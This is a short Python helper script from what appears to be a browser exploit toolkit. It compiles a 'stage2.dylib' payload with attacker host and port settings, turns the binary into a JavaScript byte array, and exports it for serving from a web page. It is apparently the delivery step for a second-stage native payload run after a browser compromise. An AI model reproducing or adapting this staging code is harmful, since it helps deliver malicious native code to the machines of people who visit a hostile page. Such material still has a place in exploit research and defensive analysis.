#!/usr/bin/env python3

import subprocess

from config import *

# Compile the .dylib
subprocess.run(['env', 'HOST={}'.format(HOST), 'HTTP_PORT={}'.format(HTTP_PORT), 'TCPLOG_PORT={}'.format(TCPLOG_PORT), 'make'], check=True)

# Convert the .dylib to a JS array literal
payload = open('stage2.dylib', 'rb').read()

js = 'var stage2 = new Uint8Array(['
js += ','.join(map(str, payload))
js += ']);\n'

with open('stage2.js', 'w') as f:
    f.write(js)

EXPORTS = [
        {'path': 'stage2.js', 'content_type': 'text/javascript; charset=UTF-8'}
]
